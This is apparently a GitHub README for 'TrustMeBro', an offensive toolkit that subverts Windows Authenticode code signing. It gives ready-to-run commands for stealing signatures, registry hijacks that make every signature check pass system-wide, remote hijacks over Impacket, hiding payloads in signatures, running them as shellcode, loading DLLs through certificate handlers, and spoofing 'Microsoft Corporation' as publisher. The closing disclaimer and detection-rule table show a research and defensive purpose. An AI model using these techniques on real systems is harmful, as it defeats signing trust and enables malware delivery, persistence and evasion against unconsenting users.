# TrustMeBro

Authenticode signature manipulation toolkit for Red Team operations and security research. Covers signature stealing, metadata cloning, SIP hijacking across 19 file types, WinVerifyTrust FinalPolicy bypass, PKCS#7 payload embedding, and analyst-triggered code execution via OID handlers.

Available in Python (cross-platform) and C++ (Windows native).

## Repository Structure

```
TrustMeBro/
├── TrustMeBro/                         C++ native tool
│   ├── main.cpp                        Entry point
│   ├── steal.h                         Signature stealing, SIP hijack, FinalPolicy
│   ├── pkcs7_embed.h                   Zero-dependency ASN.1 DER embed/extract
│   └── TrustMeBro.inf                  INF-based SIP hijack (right-click Install)
├── SigStash/                           Payload extraction from signed PEs
│   ├── loader.cpp                      Argument-based loader (reads a carrier file)
│   └── stub.c                          Self-extracting stub (reads its own PE)
├── tools/
│   └── FormatGhost/                    CryptDllFormatObject persistence tool
│       ├── format_ghost.c              DLL template
│       ├── register.py                 Registry OID registration helper
│       ├── Makefile
│       └── README.md
├── detection/                          YARA and Sigma detection rules
├── experimental/
│   ├── publisher-spoof/                Publisher name spoofing (cert + TrustedPublisher)
│   └── dual-signerinfo/                Dual SignerInfo parser-divergence research
├── docs/
│   ├── SIP_COMPLETE_MAP.md             Full 19-GUID SIP reference
│   ├── 01-sigflip.svg                  SigFlip technique diagram
│   ├── 02-sigstash-direct.svg          SigStash direct mode diagram
│   └── 03-sigstash-camouflage.svg      SigStash camouflage mode diagram
├── bin/                                Pre-compiled Windows binaries
│   ├── TrustMeBro.exe
│   ├── SigStashLoader.exe
│   ├── SigStashStub.exe
│   └── SigStashStubCamo.exe
├── TrustMeBro.py                       Python cross-platform tool
├── LICENSE
└── README.md
```

---

## How It Works

### SigFlip (CVE-2013-3900), for comparison
<p align="center">
  <img src="docs/01-sigflip.svg" alt="SigFlip embeds payload in certificate table padding" width="700"/>
</p>

### SigStash, Direct Mode
<p align="center">
  <img src="docs/02-sigstash-direct.svg" alt="SigStash embeds payload inside PKCS#7 DER unsignedAttrs" width="700"/>
</p>

### SigStash, Camouflage Mode
<p align="center">
  <img src="docs/03-sigstash-camouflage.svg" alt="SigStash wraps payload in fake SPC_NESTED_SIGNATURE" width="700"/>
</p>

---

## TrustMeBro (Core Tool)

The main tool. Handles signature stealing, metadata cloning, registry-based SIP hijacking, FinalPolicy bypass, custom trust provider registration, PKCS#7 payload embedding, and SIP execution surface registration.

### Signature Stealing

Reads the `WIN_CERTIFICATE` blob from a signed donor PE and appends it to a target binary. Updates the PE header security directory pointer.

### Metadata Cloning

Copies the `.rsrc` section (icons, version info, manifest) from a donor PE into the target. Fixes Resource Directory RVAs automatically. Uses `objcopy` on Linux, native `UpdateResource` APIs on Windows.

### SIP Hijacking (17 standard + 2 optional)

Redirects `CryptSIPDllVerifyIndirectData` to `ntdll!DbgUiContinue` for 17 file types by default. Two additional SIPs are available via flags.

Default (17 SIPs): PE, Java, CAB, MSI, PowerShell, JScript, VBScript, WSF, AppX, AppX Bundle, Encrypted AppX, Encrypted AppX Bundle, P7X, CTL, Flat, Catalog, ESD.

Optional:
- `--sac` adds Smart App Control SIP (`{18B3C141}`, Win11 only)
- `--all-sips` adds all 19 GUIDs including Win11 AppX Extensions

Full GUID reference: [docs/SIP_COMPLETE_MAP.md](docs/SIP_COMPLETE_MAP.md)

### FinalPolicy Hijack

Redirects the WinVerifyTrust FinalPolicy step to `wintrust!SoftpubCleanup`. One registry write. System-wide. Every signature check returns success. Stolen signatures display the donor cert's Subject CN as verified publisher in UAC consent dialogs.

### Custom Trust Provider GUID

Registers a new action GUID with FinalPolicy pointing to SoftpubCleanup. Same bypass behavior but avoids detection rules keyed to the well-known Authenticode GUID.

### WOW64-Only Mode

Writes SIP hijack keys only to `HKLM\SOFTWARE\WOW6432Node\...`. Affects 32-bit WinVerifyTrust callers while leaving the 64-bit registry view clean.

### PKCS#7 Payload Embedding (SigStash)

Embeds arbitrary data in `SignerInfo.unsignedAttrs` of an Authenticode-signed PE. Per RFC 5652 section 5.3, unauthenticated attributes are not covered by the signature. The Authenticode hash and certificate chain stay intact.

Two modes:
- **Direct:** payload stored as `OCTET STRING` under custom OID `1.3.6.1.4.1.311.99.1`
- **Camouflage:** payload wrapped in a fake `SPC_NESTED_SIGNATURE` (`1.3.6.1.4.1.311.2.4.1`). Uses the same OID that `signtool sign /as` creates for dual-signed PEs. Evades OID-anomaly scanners.

Handles dual-signed PEs. When multiple `WIN_CERTIFICATE` entries exist, embeds into the selected entry (default: last/SHA-256) and preserves the others.

### CryptSIPDllIsMyFileType2 Execution Surface

Registers a custom SIP GUID with a caller-supplied DLL as the `IsMyFileType2` handler. The DLL loads in any process that calls WinVerifyTrust during SIP file-type resolution.

---

### Usage: C++ (Windows Native)

```cmd
:: Steal signature + clone metadata + hijack registry (all-in-one)
TrustMeBro.exe C:\Windows\explorer.exe agent.exe --clone

:: Steal only, no registry modification
TrustMeBro.exe C:\Windows\explorer.exe agent.exe --no-hijack

:: FinalPolicy hijack (system-wide trust bypass)
TrustMeBro.exe --finalpolicy
TrustMeBro.exe --finalpolicy-clean

:: Custom trust provider GUID
TrustMeBro.exe --custom-provider {GUID}
TrustMeBro.exe --custom-provider-clean {GUID}

:: Restore all SIP registry keys to defaults
TrustMeBro.exe --clean

:: Embed payload into signed PE
TrustMeBro.exe --embed payload.bin signed.exe output.exe
TrustMeBro.exe --embed payload.bin signed.exe output.exe --camouflage

:: Extract payload from signed PE
TrustMeBro.exe --extract recovered.bin output.exe
TrustMeBro.exe --extract recovered.bin output.exe --camouflage
```

### Usage: Python (Cross-Platform)

Requirements: Python 3.10+, `asn1crypto` (for embed/extract), `objcopy` (for metadata cloning), `impacket` (for remote hijack).

```bash
pip install asn1crypto
```

```bash
# Signature stealing
python3 TrustMeBro.py steal -s explorer.exe -t agent.exe
python3 TrustMeBro.py steal -s explorer.exe -t agent.exe --clone

# SIP hijack (remote via Impacket)
python3 TrustMeBro.py hijack 192.168.1.10 -u Administrator -p Password123
python3 TrustMeBro.py hijack 192.168.1.10 -u Administrator -p Password123 --action clean

# SIP hijack with Smart App Control (Win11)
python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --sac
python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --all-sips

# WOW64-only (32-bit callers hijacked, 64-bit registry untouched)
python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --wow64-only

# FinalPolicy hijack (system-wide trust bypass)
python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --action finalpolicy
python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --action finalpolicy-clean

# Custom trust provider GUID
python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --action custom-provider
python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --action custom-provider-clean --provider-guid {GUID}

# PKCS#7 payload embedding
python3 TrustMeBro.py embed -s signed.exe -p payload.bin -o output.exe
python3 TrustMeBro.py embed -s signed.exe -p payload.bin -o output.exe --camouflage
python3 TrustMeBro.py embed -s signed.exe -p payload.bin -o output.exe --signer-index 0

# Payload extraction
python3 TrustMeBro.py extract -s output.exe -o recovered.bin
python3 TrustMeBro.py extract -s output.exe -o recovered.bin --camouflage

# CryptSIPDllIsMyFileType2 execution surface
python3 TrustMeBro.py sip-exec --dll "C:\Temp\payload.dll"
python3 TrustMeBro.py sip-exec --dll "C:\Temp\payload.dll" --guid "{CUSTOM-GUID}"
```

### INF-based SIP Hijack

Quick local hijack without running the EXE:
```cmd
rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\TrustMeBro\TrustMeBro.inf
```

---

## SigStash (Payload Loader and Self-Extracting Stub)

Two payload extraction tools for retrieving embedded data from a carrier PE's PKCS#7 signature.

### SigStash Loader (`SigStash/loader.cpp`)

Takes a carrier PE path as an argument. Extracts the embedded payload and prints it or executes it as shellcode (`--exec`, Windows only). Supports both direct OID and camouflage mode.

```cmd
SigStashLoader.exe carrier.exe
SigStashLoader.exe carrier.exe --camouflage
SigStashLoader.exe carrier.exe --exec
```

### SigStash Self-Extracting Stub (`SigStash/stub.c`)

Reads its own PE file from disk via `GetModuleFileName(NULL)`. Scans its own WIN_CERTIFICATE region for the target OID. Writes the payload to `%TEMP%\sigstash_out.bin`. No arguments needed. No external loader.

Two compile-time variants:
- Direct mode: scans for OID `1.3.6.1.4.1.311.99.1`
- Camouflage mode (`-DCAMOUFLAGE_MODE=1`): scans for `SPC_NESTED_SIGNATURE` and walks the nested ContentInfo

Pipeline:
```
1. Compile stub.exe (or stub_camo.exe with -DCAMOUFLAGE_MODE=1)
2. Sign with osslsigncode or signtool
3. Embed payload: python3 TrustMeBro.py embed -s signed_stub.exe -p payload.bin -o final.exe
4. Run final.exe on target. Payload appears at %TEMP%\sigstash_out.bin
```

Build:
```bash
x86_64-w64-mingw32-gcc -O2 -s -o SigStashStub.exe SigStash/stub.c -lkernel32
x86_64-w64-mingw32-gcc -O2 -s -DCAMOUFLAGE_MODE=1 -o SigStashStubCamo.exe SigStash/stub.c -lkernel32
```

---

## FormatGhost (Standalone Tool)

Standalone research tool at `tools/FormatGhost/`. Separate from TrustMeBro. No shared code.

Registers a DLL as a `CryptDllFormatObject` handler for a custom OID. When `certutil -dump`, certificate property dialogs, or any code calling `CryptFormatObject` parses a PE containing that OID in its PKCS#7 attributes, the registered DLL loads into the calling process.

Requires admin for registry write. Requires user interaction to trigger (not automatic during WinVerifyTrust).

Components:
- `register.py`: registers or removes the OID handler in the registry
- `format_ghost.c`: DLL template that extracts the raw attribute bytes and writes them to `%TEMP%\format_ghost_payload.bin`

```bash
# Build the DLL
cd tools/FormatGhost && make

# Register (on target, admin required)
python3 register.py --oid 1.3.6.1.4.1.311.99.1 --dll C:\Temp\format_ghost.dll --funcname FormatObject

# Trigger: certutil -dump carrier.exe  ->  DLL loaded, payload extracted

# Clean up
python3 register.py --oid 1.3.6.1.4.1.311.99.1 --clean
```

See `tools/FormatGhost/README.md` for details.

---

## Experimental

Research prototypes. Not merged into the main tool. Not production-ready.

### Publisher Name Spoofing (`experimental/publisher-spoof/`)

Generates a self-signed certificate with a caller-supplied Common Name, prints instructions for enrolling it in the TrustedPublisher store, and signing a PE. Combined with SIP hijack or FinalPolicy hijack, the UAC dialog shows the chosen publisher name.

```bash
python3 experimental/publisher-spoof/spoof_publisher.py --cn "Microsoft Corporation" --output-cert ms.crt --output-key ms.key
```

Does not auto-enroll or auto-sign. Prints manual steps.

### Dual-SignerInfo Research (`experimental/dual-signerinfo/`)

Documentation-only. No code. Describes the parser divergence between kernel `ci.dll` (reads `SignerInfo[0]` only) and user-mode `wintrust` (iterates all `SignerInfo` entries). Notes are at `experimental/dual-signerinfo/dual_signer_notes.md`.

---

## Detection Rules

YARA and Sigma rules in the `detection/` directory. Rules marked "own technique" detect techniques this tool implements. Rules marked "external" cover related techniques for operator awareness.

| File | Format | Detects | Targets |
|---|---|---|---|
| `sip_hijack_registry.yar` | YARA | SIP hijack via CryptSIPDllVerifyIndirectData redirect to DbgUiContinue | Own technique |
| `sip_hijack_gate1.yar` | YARA | SIP hijack gate-1 artifact fingerprint | Own technique |
| `sip_hijack_expanded.yar` | YARA | SIP hijack targeting script and package SIPs (VBS, JS, WSF, CAB, Catalog, AppX) | Own technique |
| `sip_hijack_registry_modify.sigma` | Sigma | Registry modification of CryptSIPDllVerifyIndirectData keys | Own technique |
| `custom_provider_finalpolicy.sigma` | Sigma | FinalPolicy registration under non-standard action GUIDs (SoftpubCleanup) | Own technique |
| `shape2_dual_signerinfo.yar` | YARA | Dual SignerInfo entries in WIN_CERTIFICATE | External |
| `esbcache_bypass.yar` | YARA | ESBCACHE EA manipulation artifacts | External |
| `esbcache_bypass.sigma` | Sigma | Unsigned driver load via ESBCACHE bypass | External |
| `b1_ffi_behavior.sigma` | Sigma | Driver service created from root drive path (FFI pattern) | External |

---

## Building from Source

C++ (cross-compile from Linux):
```bash
# TrustMeBro main tool
x86_64-w64-mingw32-g++ -std=c++17 -O2 -o bin/TrustMeBro.exe TrustMeBro/main.cpp -lshlwapi

# SigStash loader
x86_64-w64-mingw32-g++ -std=c++17 -O2 -o bin/SigStashLoader.exe SigStash/loader.cpp

# SigStash self-extracting stub
x86_64-w64-mingw32-gcc -O2 -s -o bin/SigStashStub.exe SigStash/stub.c -lkernel32
x86_64-w64-mingw32-gcc -O2 -s -DCAMOUFLAGE_MODE=1 -o bin/SigStashStubCamo.exe SigStash/stub.c -lkernel32

# FormatGhost DLL
cd tools/FormatGhost && make
```

C++ (Visual Studio on Windows):
```cmd
cl /std:c++17 /O2 /Fe:TrustMeBro.exe TrustMeBro\main.cpp shlwapi.lib
cl /std:c++17 /O2 /Fe:SigStashLoader.exe SigStash\loader.cpp
```

No external dependencies for the C++ tools. `pkcs7_embed.h` is a self-contained ASN.1 DER parser in ~500 lines.

---

## Disclaimer

This tool is for educational purposes and authorized security testing only. Misuse to attack systems without consent is illegal. The authors are not responsible for damage caused by this software.

## Credits

- [SigFlip](https://github.com/med0x2e/SigFlip) by med0x2e. Payload embedding in Authenticode signatures via certificate table padding (CVE-2013-3900). The PKCS#7 approach was directly inspired by SigFlip.
- [SignatureKid](https://github.com/dslee2022/SignatureKid) by David Lee. Signature manipulation research and original signature stealing code.
- [MetaTwin](https://github.com/threatexpress/metatwin) by ThreatExpress. Binary metadata cloning concept.
- Matt Graeber. Subject Interface Package and Trust Provider research documenting the SIP/WVT hijack attack surface.
